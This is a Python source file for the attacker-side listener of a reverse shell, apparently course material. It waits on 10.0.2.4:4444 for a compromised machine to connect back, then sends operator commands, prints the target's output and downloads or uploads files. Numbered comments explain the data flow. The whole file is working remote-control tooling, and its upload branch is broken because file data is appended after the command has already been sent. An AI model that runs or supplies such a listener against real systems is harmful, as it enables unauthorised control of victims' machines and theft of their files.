#!/usr/bin/env python

import socket, json, base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for connection.")
        self.connection, address = listener.accept()
        print("[+] Connection received from " + str(address) + ".")

    def reliable_send(self, data):
        json_data = json.dumps(data) #(3)Command string is parameterized into 'data' string, then is turned into json string format and passed into the json_data variable.
        json_data = json_data.encode("UTF-8") #(4) The json data stream is made ready for tcp upload by being turned into a bytes object.
        self.connection.send(json_data) #(5) The json_data byte object is uploaded via tcp to the target pc.

    def reliable_rec(self):
        complete_data = ""
        while True: #starts a loop
            try:
                json_data = self.connection.recv(1024) #(7) initializes the receiving connection, as well as puts the recieved data into a 1024 object variable, recieve type must be UTF-8.
                json_data = json_data.decode("ASCII") #(8) Changes the UTF-8 into string readable by the json_string command.
                complete_data = complete_data + json_data #(9) takes the json string and adds it to the initialized variable, continues adding in loop until json_data is complete.
                return json.loads(complete_data) #(10) (CHECKS IF DATA IS COMPLETE) Decodes the json_string into regular string, and returns the string back to the execute_remotely function
            except ValueError: #(11) Because the json.loads function will through a ValueError if the json data is not complete, this allows us to add onto the string until it is complete.
                continue

    def write_file(self, path, content):
        with open(path, "wb") as file:
            content = content.encode("UTF-8")
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def execute_remotely(self, command):
        self.reliable_send(command)  # (2) Passes the command string to the send function.
        if command[0] == "exit":
                self.connection.close()
                exit()
        return self.reliable_rec() #(6) After sending the command (3-5), calls the receive function to receive output.

    def run(self):
        while True:
            command = input('>> ')
            command = command.split(" ")
            result = self.execute_remotely(command) #Starts flow (1), passes command string to execute remotely.
            if command[0] == "download":
                result = self.write_file(command[1], result)
            elif command[0] == "upload":
                file_content = self.read_file(command[1])
                command.append(file_content)
            print(result) #(11) The final string stored in the result variable is printed, and thus the loop is started again.

my_listener = Listener("10.0.2.4", 4444)
my_listener.run()
